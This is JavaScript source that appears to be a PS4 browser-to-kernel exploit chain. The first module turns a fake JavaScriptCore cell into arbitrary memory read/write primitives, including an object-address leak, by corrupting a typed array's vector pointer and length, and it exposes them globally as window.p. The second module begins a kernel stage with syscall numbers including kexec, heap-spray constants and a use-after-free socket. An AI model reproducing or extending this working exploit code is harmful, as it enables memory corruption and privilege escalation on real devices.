import { releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector } from "./core.js?v=10";
var carrier = null;
function toI64(x) {
  if (x instanceof int64) return x;
  if (typeof x === "number") {
    if (!Number.isFinite(x) || Math.floor(x) !== x || x < 0) throw new TypeError("mem: bad numeric address ".concat(x));
    var hi = Math.floor(x / 0x100000000);
    return new int64(x - hi * 0x100000000, hi);
  }
  if (x !== null && typeof x === "object" && "low" in x) return new int64(x.low, "hi" in x ? x.hi : x.high);
  throw new TypeError("mem: bad address");
}
function addrNumber(x) {
  var a = toI64(x);
  if (a.hi > 0xffff) throw new RangeError("mem: non-canonical address 0x".concat(a.toString()));
  return a.hi * 0x100000000 + a.low;
}
function aimFor(addrLike, size) {
  var address = addrNumber(addrLike);
  if (size > carrier.windowBytes) throw new RangeError("mem: ".concat(size, " exceeds the ").concat(carrier.windowBytes, "-byte window"));
  carrier.aim(address);
  return address;
}
function valueLow32(value, who) {
  if (typeof value === "number") {
    if (!Number.isFinite(value) || Math.floor(value) !== value) throw new TypeError("".concat(who, ": non-integer value ").concat(value));
    return value >>> 0;
  }
  if (value instanceof int64) return value.low >>> 0;
  if (value !== null && typeof value === "object" && "low" in value) return toI64(value).low >>> 0;
  throw new TypeError("".concat(who, ": value must be a number or an int64"));
}
function read1(addr) {
  aimFor(addr, 1);
  try {
    return carrier.view[0];
  } finally {
    carrier.restore();
  }
}
function read2(addr) {
  aimFor(addr, 2);
  try {
    var v = carrier.view;
    return v[0] | v[1] << 8;
  } finally {
    carrier.restore();
  }
}
function read4(addr) {
  aimFor(addr, 4);
  try {
    var v = carrier.view;
    return (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
  } finally {
    carrier.restore();
  }
}
function read8(addr) {
  var lo, hi;
  aimFor(addr, 8);
  try {
    var v = carrier.view;
    lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
    hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
  } finally {
    carrier.restore();
  }
  return new int64(lo, hi);
}
function write1(addr, value) {
  var v = valueLow32(value, "mem.write1") & 0xff;
  aimFor(addr, 1);
  try {
    carrier.view[0] = v;
  } finally {
    carrier.restore();
  }
}
function write2(addr, value) {
  var v = valueLow32(value, "mem.write2") & 0xffff;
  aimFor(addr, 2);
  try {
    var view = carrier.view;
    view[0] = v & 0xff;
    view[1] = v >>> 8 & 0xff;
  } finally {
    carrier.restore();
  }
}
function write4(addr, value) {
  var v = valueLow32(value, "mem.write4");
  aimFor(addr, 4);
  try {
    var view = carrier.view;
    view[0] = v & 0xff;
    view[1] = v >>> 8 & 0xff;
    view[2] = v >>> 16 & 0xff;
    view[3] = v >>> 24 & 0xff;
  } finally {
    carrier.restore();
  }
}
function write8(addr, value) {
  var lo, hi;
  if (value instanceof int64) {
    lo = value.low >>> 0;
    hi = value.hi >>> 0;
  } else if (typeof value === "number") {
    if (!Number.isFinite(value) || Math.floor(value) !== value) throw new TypeError("mem.write8: non-integer value ".concat(value));
    if (value < 0) {
      if (value < -0x80000000) throw new RangeError("mem.write8: value ".concat(value, " below int32 range"));
      lo = value >>> 0;
      hi = 0xffffffff;
    } else if (value <= 0xffffffff) {
      lo = value >>> 0;
      hi = 0;
    } else {
      throw new RangeError("mem.write8: ".concat(value, " exceeds 32 bits -- pass an int64"));
    }
  } else if (value !== null && typeof value === "object" && "low" in value) {
    var n = toI64(value);
    lo = n.low;
    hi = n.hi;
  } else {
    throw new TypeError("mem.write8: value must be int64 or number");
  }
  aimFor(addr, 8);
  try {
    var view = carrier.view;
    view[0] = lo & 0xff;
    view[1] = lo >>> 8 & 0xff;
    view[2] = lo >>> 16 & 0xff;
    view[3] = lo >>> 24 & 0xff;
    view[4] = hi & 0xff;
    view[5] = hi >>> 8 & 0xff;
    view[6] = hi >>> 16 & 0xff;
    view[7] = hi >>> 24 & 0xff;
  } finally {
    carrier.restore();
  }
}
function leakval(obj) {
  if (obj === null || typeof obj !== "object" && typeof obj !== "function") throw new TypeError("mem.leakval: not an object");
  carrier.setLeakSlot(obj);
  var lo, hi;
  try {
    aimFor(carrier.leakSlotAddress, 8);
    try {
      var v = carrier.view;
      lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
      hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
    } finally {
      carrier.restore();
    }
  } finally {
    carrier.clearLeakSlot();
  }
  if (hi > 0xffff || lo === 0 && hi === 0 || (lo & 7) !== 0) throw new Error("mem.leakval: implausible cell 0x".concat(new int64(lo, hi).toString()));
  return new int64(lo, hi);
}
function readInto(dest, addr, count) {
  var base = addrNumber(addr);
  var done = 0;
  while (done < count) {
    var chunk = Math.min(count - done, carrier.windowBytes);
    aimFor(base + done, chunk);
    try {
      for (var i = 0; i < chunk; ++i) dest[done + i] = carrier.view[i];
    } finally {
      carrier.restore();
    }
    done += chunk;
  }
  return dest;
}
var WORKER_BUFFER_SIZE = 0x100;
var PAIR_IDENT_OFFSET = 0x20;
var MAIN_IDENT_OFFSET = 0x40;
var PAIR_HEADER_BYTES = 0x20;
var HOME_BYTE = 0x3c;
var WORKER_LENGTH_MAX = 0xffffffff;
var mainMagic = new Uint8Array([0x63, 0x9e, 0x1f, 0x29, 0xd2, 0x84, 0x0b, 0x5c]);
var workerMagic = new Uint8Array([0x9e, 0x37, 0x79, 0xb9, 0x7f, 0x4a, 0x7c, 0x15]);
var workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
var identityBytes = new Uint8Array(8);
var workerOriginalVector = new Uint8Array(8);
var workerOriginalLength = new Uint8Array(4);
var pairScratch = new ArrayBuffer(8);
var pairScratchBytes = new Uint8Array(pairScratch);
var pairScratchWords = new Uint32Array(pairScratch);
var mainView = null;
var workerBuffer = null;
var workerView = null;
var workerMirror = null;
var pairVectorOffset = -1;
var retained = [];
export var pairStatus = {
  state: "not-attempted",
  promoted: false,
  committed: false,
  rolledBack: false,
  rollbackClean: null,
  fallback: false,
  stage: "not-attempted",
  failedAt: null,
  error: null,
  vectorOffset: -1,
  lengthOffset: -1,
  modeOffset: -1,
  butterflyOffset: -1,
  mainAddress: null,
  mainVector: null,
  mainRecordVector: null,
  mainWindow: -1,
  mainCellFromFakeSlot: null,
  mainIdentity: null,
  mainAtHome: null,
  workerAddress: null,
  workerVector: null,
  workerButterfly: null,
  workerWindow: -1,
  workerLength: -1,
  workerIdentity: null,
  structureID: -1,
  mode: -1,
  leakvalAgrees: false,
  fakeAddress: null,
  fakeButterfly: null,
  released: []
};
function u32At(bytes, offset) {
  return (bytes[offset] | bytes[offset + 1] << 8 | bytes[offset + 2] << 16 | bytes[offset + 3] << 24) >>> 0;
}
function low48At(bytes, offset) {
  return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 + bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
}
function canonical48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}
function sameBytes(left, right, count) {
  for (var i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}
function hexOf(bytes, count) {
  var out = "";
  for (var i = 0; i < count; ++i) out += (bytes[i] & 0xff).toString(16).padStart(2, "0");
  return out;
}
function pairAim(address) {
  var high = Math.floor(address / 0x100000000);
  pairScratchWords[0] = address - high * 0x100000000;
  pairScratchWords[1] = high;
  for (var i = 0; i < 8; ++i) mainView[pairVectorOffset + i] = pairScratchBytes[i];
}
function pairRestore() {
  for (var i = 0; i < 8; ++i) mainView[pairVectorOffset + i] = workerOriginalVector[i];
}
function buildPairCarrier(fake) {
  var validate = fake.validate;
  return {
    aim(address) {
      if (mainView === null || workerView === null) throw new Error("mem.pair.aim: the pair has been dropped");
      if (!validate(address)) throw new RangeError("mem.pair.aim: implausible address ".concat(address));
      pairAim(address);
    },
    restore() {
      if (mainView === null) throw new Error("mem.pair.restore: the pair has been dropped");
      pairRestore();
    },
    get view() {
      return workerView;
    },
    windowBytes: WORKER_BUFFER_SIZE,
    holder: fake.holder,
    holderAddress: fake.holderAddress,
    leakSlotOffset: fake.leakSlotOffset,
    leakSlotAddress: fake.leakSlotAddress,
    setLeakSlot: fake.setLeakSlot,
    clearLeakSlot: fake.clearLeakSlot,
    anchorObject: fake.anchorObject,
    anchorObjectAddress: fake.anchorObjectAddress,
    textarea: fake.textarea,
    textareaAddress: fake.textareaAddress,
    profile: fake.profile,
    attempts: fake.attempts,
    validate,
    hostAddress: fake.hostAddress,
    fakeAddress: fake.fakeAddress,
    pair: pairStatus,
    assertHome() {
      if (workerView === null || workerMirror === null) return false;
      return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
    }
  };
}
function brokenCarrier(why) {
  var die = function () {
    throw new Error("mem: the primitive is disabled -- the promotion failed " + "and its rollback did not verify (".concat(why, ")"));
  };
  return {
    aim: die,
    restore: die,
    setLeakSlot: die,
    clearLeakSlot: die,
    get view() {
      return die();
    },
    get windowBytes() {
      return die();
    },
    get leakSlotAddress() {
      return die();
    },
    validate: function () {
      return false;
    },
    assertHome: function () {
      return false;
    },
    profile: null,
    pair: pairStatus
  };
}
function proveMagic(note, who, slot, at, expected, context) {
  var target = toI64(at);
  var record = {
    at: target,
    expected: hexOf(expected, 8),
    found: null,
    pass: false
  };
  pairStatus[slot] = record;
  readInto(identityBytes, at, 8);
  record.found = hexOf(identityBytes, 8);
  record.pass = sameBytes(identityBytes, expected, 8);
  note("PAIR-IDENTITY-".concat(who.toUpperCase()), "at=0x".concat(target.toString(), "-found=").concat(record.found) + "-expected=".concat(record.expected, "-pass=").concat(record.pass, "-").concat(context));
  if (!record.pass) throw new Error("mem.promote: ".concat(who, " identity failed -- read ") + "".concat(record.found, " at 0x").concat(target.toString(), ", expected ") + "".concat(record.expected, " (").concat(context, ")"));
  return record;
}
export function promoteToRealPair(onEvent) {
  var note = function (tag, detail) {
    pairStatus.stage = tag;
    if (typeof onEvent === "function") {
      try {
        onEvent(tag, detail === undefined ? "" : String(detail));
      } catch {}
    }
  };
  if (pairStatus.promoted) throw new Error("mem.promote: already promoted");
  if (carrier === null || typeof carrier.aim !== "function") throw new TypeError("mem.promote: no carrier");
  if (fakeCellReleased()) throw new Error("mem.promote: core.js already released the fake cell");
  var fake = carrier;
  var profile = fake.profile;
  if (!profile || typeof profile.vectorOffset !== "number" || typeof profile.butterflyOffset !== "number" || typeof profile.inlineSlotOffset !== "number") throw new TypeError("mem.promote: carrier has no layout profile");
  if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress) || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress) || fake.fakeAddress - fake.hostAddress !== profile.inlineSlotOffset) throw new TypeError("mem.promote: the fake cell's address is unusable " + "(host=".concat(fake.hostAddress, " fake=").concat(fake.fakeAddress, ")"));
  var VECTOR_OFF = profile.vectorOffset;
  var LENGTH_OFF = VECTOR_OFF + 8;
  var MODE_OFF = LENGTH_OFF + 4;
  var BUTTERFLY_OFF = profile.butterflyOffset;
  pairStatus.vectorOffset = VECTOR_OFF;
  pairStatus.lengthOffset = LENGTH_OFF;
  pairStatus.modeOffset = MODE_OFF;
  pairStatus.butterflyOffset = BUTTERFLY_OFF;
  var committed = false;
  var rebound = false;
  try {
    note("PAIR-BEGIN", "window=".concat(fake.windowBytes, "-vector=+").concat(VECTOR_OFF) + "-length=+".concat(LENGTH_OFF, "-mode=+").concat(MODE_OFF));
    var mainRecord = carrierHeaderCopy();
    var mainHomeVector = carrierHomeVector();
    if (!(mainRecord instanceof Uint8Array) || mainRecord.length < PAIR_HEADER_BYTES) throw new Error("mem.promote: core.js's carrier record is the wrong shape");
    var recordVector = low48At(mainRecord, VECTOR_OFF);
    pairStatus.mainVector = toI64(mainHomeVector);
    pairStatus.mainRecordVector = toI64(recordVector);
    pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
    pairStatus.structureID = u32At(mainRecord, 0);
    note("PAIR-MAIN-RECORD", "home=0x".concat(pairStatus.mainVector.toString()) + "-record=0x".concat(pairStatus.mainRecordVector.toString()) + "-len=".concat(pairStatus.mainWindow, "-mode=").concat(mainRecord[MODE_OFF]) + "-sid=0x".concat((pairStatus.structureID >>> 0).toString(16)));
    if (recordVector !== mainHomeVector) throw new Error("mem.promote: profile.vectorOffset disagrees with the " + "recorded home vector (record 0x".concat(pairStatus.mainRecordVector.toString()) + " vs home 0x".concat(pairStatus.mainVector.toString(), ")"));
    if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0) throw new Error("mem.promote: the recorded home vector is implausible " + "(0x".concat(pairStatus.mainVector.toString(), ")"));
    if (pairStatus.mainWindow !== fake.windowBytes) throw new Error("mem.promote: the record's m_length (".concat(pairStatus.mainWindow, ")") + " is not the carrier window (".concat(fake.windowBytes, ")") + " -- LENGTH_OFF does not hold on main");
    mainView = fake.view;
    retained.push(mainView);
    if (!(mainView instanceof Uint8Array) || mainView.length !== fake.windowBytes || MAIN_IDENT_OFFSET + 8 > fake.windowBytes) throw new Error("mem.promote: the carrier's view is not what core.js described");
    pairStatus.fakeAddress = toI64(fake.fakeAddress);
    pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
    note("PAIR-FAKE-BUTTERFLY", "host=0x".concat(toI64(fake.hostAddress).toString()) + "-fake=0x".concat(pairStatus.fakeAddress.toString()) + "-butterfly=0x".concat(pairStatus.fakeButterfly.toString()));
    workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
    workerView = new Uint8Array(workerBuffer);
    workerMirror = new Uint8Array(workerBuffer);
    retained.push(workerBuffer, workerView, workerMirror);
    workerMirror[0] = HOME_BYTE;
    for (var i = 0; i < 8; ++i) workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
    if (workerView[0] !== HOME_BYTE) throw new Error("mem.promote: workerView does not alias workerMirror");
    for (var _i = 0; _i < 8; ++_i) mainView[MAIN_IDENT_OFFSET + _i] = mainMagic[_i];
    for (var _i2 = 0; _i2 < 8; ++_i2) {
      if (mainView[MAIN_IDENT_OFFSET + _i2] !== mainMagic[_i2]) throw new Error("mem.promote: main's magic did not read back through " + "its own JS view -- the carrier is not at home");
    }
    var mainAddr = addrNumber(leakval(mainView));
    var workerAddr = addrNumber(leakval(workerView));
    pairStatus.mainAddress = toI64(mainAddr);
    pairStatus.workerAddress = toI64(workerAddr);
    note("PAIR-CELLS", "main=0x".concat(pairStatus.mainAddress.toString()) + "-worker=0x".concat(pairStatus.workerAddress.toString()));
    if (mainAddr === workerAddr) throw new Error("mem.promote: main and worker leaked the same cell");
    if (mainAddr % 0x10 !== 0 || workerAddr % 0x10 !== 0) throw new Error("mem.promote: a leaked cell is not atom-aligned");
    var fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
    pairStatus.mainCellFromFakeSlot = fromFakeSlot;
    note("PAIR-MAIN-CELL", "fake-m_vector=0x".concat(fromFakeSlot.toString()) + "-leakval=0x".concat(pairStatus.mainAddress.toString()) + "-at=0x".concat(toI64(fake.fakeAddress + VECTOR_OFF).toString()));
    if (fromFakeSlot.low !== pairStatus.mainAddress.low || fromFakeSlot.hi !== pairStatus.mainAddress.hi) throw new Error("mem.promote: main CELL identity failed -- the fake " + "cell's m_vector slot holds 0x".concat(fromFakeSlot.toString(), " but ") + "leakval(mainView) says 0x".concat(pairStatus.mainAddress.toString()));
    proveMagic(note, "main", "mainIdentity", mainHomeVector + MAIN_IDENT_OFFSET, mainMagic, "home=0x".concat(pairStatus.mainVector.toString()) + "-cell=0x".concat(pairStatus.mainAddress.toString()) + "-offset=+0x".concat(MAIN_IDENT_OFFSET.toString(16)));
    readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
    var workerVector = low48At(workerHeader, VECTOR_OFF);
    var workerButterfly = low48At(workerHeader, BUTTERFLY_OFF);
    pairStatus.mode = workerHeader[MODE_OFF];
    pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
    pairStatus.workerVector = toI64(workerVector);
    pairStatus.workerButterfly = toI64(workerButterfly);
    note("PAIR-WORKER-HEADER", "sid=0x".concat(u32At(workerHeader, 0).toString(16)) + "-vector=0x".concat(pairStatus.workerVector.toString()) + "-len=".concat(pairStatus.workerWindow, "-mode=").concat(pairStatus.mode) + "-butterfly=0x".concat(pairStatus.workerButterfly.toString()));
    var gate = u32At(workerHeader, 0) === pairStatus.structureID && (workerHeader[7] === 0 || workerHeader[7] === 1) && pairStatus.workerWindow === WORKER_BUFFER_SIZE && workerHeader[MODE_OFF] === mainRecord[MODE_OFF] && workerHeader[MODE_OFF + 1] === 0 && workerHeader[MODE_OFF + 2] === 0 && workerHeader[MODE_OFF + 3] === 0 && canonical48(workerHeader, BUTTERFLY_OFF) && workerButterfly > 0x100000000 && workerButterfly % 8 === 0 && canonical48(workerHeader, VECTOR_OFF) && fake.validate(workerVector) && workerVector % 8 === 0 && workerVector !== mainHomeVector;
    if (!gate) throw new Error("mem.promote: header gate failed" + " worker-len=".concat(pairStatus.workerWindow) + " worker-mode=".concat(workerHeader[MODE_OFF]) + " main-mode=".concat(mainRecord[MODE_OFF]) + " worker-sid=".concat(u32At(workerHeader, 0)) + " main-sid=".concat(pairStatus.structureID) + " worker-vector=0x".concat(pairStatus.workerVector.toString()) + " worker-butterfly=0x".concat(pairStatus.workerButterfly.toString()) + " main-home=0x".concat(pairStatus.mainVector.toString()));
    proveMagic(note, "worker", "workerIdentity", workerVector + PAIR_IDENT_OFFSET, workerMagic, "vector=0x".concat(pairStatus.workerVector.toString()) + "-cell=0x".concat(pairStatus.workerAddress.toString()) + "-offset=+0x".concat(PAIR_IDENT_OFFSET.toString(16)));
    note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");
    for (var _i3 = 0; _i3 < 8; ++_i3) workerOriginalVector[_i3] = workerHeader[VECTOR_OFF + _i3];
    for (var _i4 = 0; _i4 < 4; ++_i4) workerOriginalLength[_i4] = workerHeader[LENGTH_OFF + _i4];
    note("PAIR-COMMIT", "main=0x".concat(pairStatus.mainAddress.toString()) + "-worker=0x".concat(pairStatus.workerAddress.toString()) + "-next=aim-without-restore");
    aimFor(workerAddr, PAIR_HEADER_BYTES);
    committed = true;
    pairStatus.committed = true;
    for (var _i5 = 0; _i5 < 4; ++_i5) mainView[LENGTH_OFF + _i5] = 0xff;
    pairStatus.workerLength = workerView.length;
    if (pairStatus.workerLength !== WORKER_LENGTH_MAX) throw new Error("mem.promote: the m_length write did not land -- " + "worker.length reads ".concat(pairStatus.workerLength));
    if (workerMirror.length !== WORKER_BUFFER_SIZE) throw new Error("mem.promote: the mirror was widened too -- the write " + "went somewhere structural, not to worker's m_length");
    if (workerView[0] !== HOME_BYTE) throw new Error("mem.promote: worker no longer sees its own buffer");
    if (mainView[MODE_OFF] !== workerHeader[MODE_OFF] || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0 || mainView[MODE_OFF + 3] !== 0) throw new Error("mem.promote: m_mode was disturbed by the widening");
    for (var _i6 = 0; _i6 < 8; ++_i6) {
      if (mainView[VECTOR_OFF + _i6] !== workerOriginalVector[_i6]) throw new Error("mem.promote: worker's m_vector moved during the widening");
    }
    note("PAIR-WIDENED", "length=0x".concat(WORKER_LENGTH_MAX.toString(16)) + "-mode=0x".concat(pairStatus.mode.toString(16)));
    pairVectorOffset = VECTOR_OFF;
    carrier = buildPairCarrier(fake);
    rebound = true;
    readInto(identityBytes, workerVector + PAIR_IDENT_OFFSET, 8);
    if (!sameBytes(identityBytes, workerMagic, 8)) throw new Error("mem.promote: read through the pair returned " + "".concat(hexOf(identityBytes, 8), ", expected ").concat(hexOf(workerMagic, 8)));
    write8(workerVector + PAIR_IDENT_OFFSET, new int64(0x0d0c0b0a, 0x04030201));
    var back = [0x0a, 0x0b, 0x0c, 0x0d, 0x01, 0x02, 0x03, 0x04];
    for (var _i7 = 0; _i7 < 8; ++_i7) {
      if (workerMirror[PAIR_IDENT_OFFSET + _i7] !== back[_i7]) throw new Error("mem.promote: write through the pair failed at byte ".concat(_i7));
    }
    for (var _i8 = 0; _i8 < 8; ++_i8) workerMirror[PAIR_IDENT_OFFSET + _i8] = workerMagic[_i8];
    var workerAgain = addrNumber(leakval(workerView));
    pairStatus.leakvalAgrees = workerAgain === workerAddr;
    if (!pairStatus.leakvalAgrees) throw new Error("mem.promote: leakval through the pair disagrees " + "(0x".concat(toI64(workerAgain).toString(), " vs ") + "0x".concat(pairStatus.workerAddress.toString(), ")"));
    var mv = read8(mainAddr + VECTOR_OFF);
    if (mv.low !== pairStatus.workerAddress.low || mv.hi !== pairStatus.workerAddress.hi) throw new Error("mem.promote: main.m_vector reads 0x".concat(mv.toString(), ",") + " expected worker's cell 0x".concat(pairStatus.workerAddress.toString()));
    if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes) throw new Error("mem.promote: main's own m_length was disturbed");
    note("PAIR-REPROVED", "main-m_vector=0x".concat(mv.toString()) + "-leakval=0x".concat(toI64(workerAgain).toString()));
    note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
    var rel = releaseFakeCell();
    pairStatus.released = rel.released;
    pairStatus.historyCleared = !!rel.historyCleared;
    if (!fakeCellReleased()) throw new Error("mem.promote: core.js did not release the fake cell");
    if (fake.assertHome() !== false) throw new Error("mem.promote: core.js's carrier still reports itself live");
    pairStatus.promoted = true;
    pairStatus.state = "pair";
    pairStatus.error = null;
    note("PAIR-UP", "main=0x".concat(pairStatus.mainAddress.toString()) + "-worker=0x".concat(pairStatus.workerAddress.toString()) + "-home=0x".concat(pairStatus.mainVector.toString()) + "-mode=0x".concat(pairStatus.mode.toString(16)) + "-sid=0x".concat(pairStatus.structureID.toString(16)) + "-released=".concat(pairStatus.released.length) + "-history-cleared=".concat(pairStatus.historyCleared));
    return pairStatus;
  } catch (error) {
    pairStatus.failedAt = pairStatus.stage;
    pairStatus.error = "".concat(error && error.name, ": ").concat(String(error && error.message));
    var clean = true;
    if (committed) {
      pairStatus.rolledBack = true;
      try {
        for (var _i9 = 0; _i9 < 8; ++_i9) mainView[VECTOR_OFF + _i9] = workerOriginalVector[_i9];
        for (var _i0 = 0; _i0 < 4; ++_i0) mainView[LENGTH_OFF + _i0] = workerOriginalLength[_i0];
      } catch {
        clean = false;
      }
      try {
        fake.restore();
      } catch {
        clean = false;
      }
      try {
        if (!(workerView.length === WORKER_BUFFER_SIZE && workerMirror.length === WORKER_BUFFER_SIZE && workerView[0] === HOME_BYTE && fake.assertHome() === true)) clean = false;
      } catch {
        clean = false;
      }
      pairStatus.rollbackClean = clean;
    }
    try {
      pairStatus.mainAtHome = fake.assertHome();
    } catch {
      pairStatus.mainAtHome = null;
    }
    pairStatus.promoted = false;
    pairStatus.fallback = true;
    pairStatus.state = committed && !clean ? "broken" : "fake";
    if (pairStatus.state === "broken") carrier = brokenCarrier(pairStatus.error);else if (rebound) carrier = fake;
    pairVectorOffset = -1;
    workerView = null;
    workerMirror = null;
    workerBuffer = null;
    mainView = null;
    note("PAIR-FALLBACK", "state=".concat(pairStatus.state) + "-committed=".concat(committed, "-rollback-clean=").concat(pairStatus.rollbackClean) + "-main-at-home=".concat(pairStatus.mainAtHome) + "-at=".concat(pairStatus.failedAt, "-").concat(pairStatus.error));
    throw error;
  }
}
export function installWindowP(c, options) {
  if (!c || typeof c.aim !== "function") throw new TypeError("mem: not a carrier");
  carrier = c;
  var prim = {
    read1,
    read2,
    read4,
    read8,
    write1,
    write2,
    write4,
    write8,
    leakval
  };
  globalThis.p = prim;
  var opts = options || {};
  if (opts.promote === false) {
    pairStatus.state = "disabled";
    pairStatus.stage = "disabled";
    pairStatus.error = "promotion disabled by the caller (negative control)";
    return prim;
  }
  try {
    promoteToRealPair(opts.onEvent);
  } catch {
    if (pairStatus.state === "broken") {
      globalThis.p = undefined;
      throw new Error("mem: the promotion failed AND its rollback did not " + "verify -- window.p has been WITHDRAWN rather than published " + "mis-aimed. failedAt=".concat(pairStatus.failedAt, " ").concat(pairStatus.error));
    }
  }
  return prim;
}
export { read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber, int64 };


// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";
var outEl = document.getElementById("out");
var stateEl = document.getElementById("state");
var lines = [];
var passCount = 0,
  failCount = 0;
var params = new URLSearchParams(location.search);
var STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
function post(tag, detail) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("PS4-S10&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
  } catch (e) {}
}
var VERBOSE = params.get("verbose") === "1";
var PROSE = [/ -- /, /\.\s/, /;\s/, /,\s+(which|so|and that|because|since|as that)\s/, /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/, /\s+so\s+[a-z]/, /\s+\([a-z][^)]{40,}\)/];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (var re of PROSE) {
    var m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}
function mark(tag, detail) {
  var raw = detail;
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  var esc = function (t) {
    return String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
  };
  outEl.innerHTML = lines.map(function (l) {
    l = esc(l);
    var c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad" : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn" : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
    return c ? '<span class="' + c + '">' + l + "</span>" : l;
  }).join("\n");
  outEl.scrollTop = outEl.scrollHeight;
  if (window.hostErrorReport) window.hostErrorReport.note(lines[lines.length - 1]);
  post(tag, raw);
}
function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);else post(tag, detail);
}
function state(t, c) {
  stateEl.textContent = t;
  stateEl.className = c || "";
  if (window.hostErrorReport) {
    window.hostErrorReport.stage(t);
    if (t === "ALL DONE") window.hostErrorReport.success();
  }
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}
function hx(n) {
  return "0x" + (n >>> 0).toString(16);
}
var SYS = {
  read: 3,
  write: 4,
  close: 6,
  getpid: 20,
  setuid: 0x17,
  getuid: 0x18,
  dup: 0x29,
  sendmsg: 0x1c,
  recvmsg: 0x1b,
  socket: 0x61,
  netcontrol: 0x63,
  socketpair: 0x87,
  kqueue: 0x16a,
  readv: 0x78,
  writev: 0x79,
  sysctl: 0xca,
  pipe: 0x2a,
  fcntl: 0x5c,
  setsockopt: 0x69,
  getsockopt: 0x76,
  sched_yield: 0x14b,
  rtprio_thread: 0x1d2,
  cpuset_setaffinity: 0x1e8,
  cpuset_getaffinity: 0x1e7,
  thr_self: 432,
  ioctl: 0x36,
  mmap: 0x1dd,
  jitshm_create: 0x215,
  kexec: 0x295
};
var NETEVENT_SET_QUEUE = 0x20000003,
  NETEVENT_CLEAR_QUEUE = 0x20000007;
var AF_UNIX = 1,
  AF_INET6 = 28,
  SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41,
  IPV6_RTHDR = 51;
var UCRED_SIZE = 0x168;
var KQUEUE_SIZE = 0x100;
var NUM_LEAK_KQUEUE = 5000;
var KQ_BATCH = 8;
var KQ_HDR_MAGIC = 0x1430000;
var NUM_UIO_IOV = 0x14,
  UIO_SIZE = 0x30;
var NUM_UIO_SPRAY = 10000;
var NUM_IOV_SPRAY_MAX = 100000;
var UIO_READ = 0,
  UIO_WRITE = 1,
  UIO_SYSSPACE = 1;
var SOL_SOCKET = 0xffff,
  SO_SNDBUF = 0x1001;
var PIPEBUF_SIZEOF = 0x18,
  PIPE_PAGE = 0x4000,
  FILEDESCENT_SIZE = 8;
var F_SETFL = 4,
  O_NONBLOCK = 4;
var IP6_RTHDR0_SIZE = 8,
  IN6_ADDR_SIZE = 0x10;
var NUM_MSG_IOV = 0x17,
  IOVEC_SIZE = 0x10,
  MSGHDR_SIZE = 0x30;
var NUM_IPV6_SOCK = 0x100;
var RTHDR_TAG = 0x13370000;
var MAX_ROUNDS_TWIN = 10,
  MAX_ROUNDS_TRIPLET = 500,
  FIND_TRIPLET_FAST = 5000;
var RTP_PRIO_REALTIME = 2,
  RTP = 0x100,
  RTP_SET = 1,
  MAIN_CORE = 7;
var RTP_LOOKUP = 0,
  RTP_PRIO_NORMAL = 0;
var CPU_LEVEL_WHICH = 3,
  CPU_WHICH_TID = 1;
var JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
var chainKeepAlive = [];
var workers = [];
var mainMf = null,
  mainOrig = null,
  mainArmed = false;
var committed = false,
  rebootRequired = false;
var kreadPoisoned = false;
var uafSock = 0;
var uafFpSaved = null;
var savedMask = null,
  savedPrio = null,
  restoreCtx = null,
  attrsRestored = false;
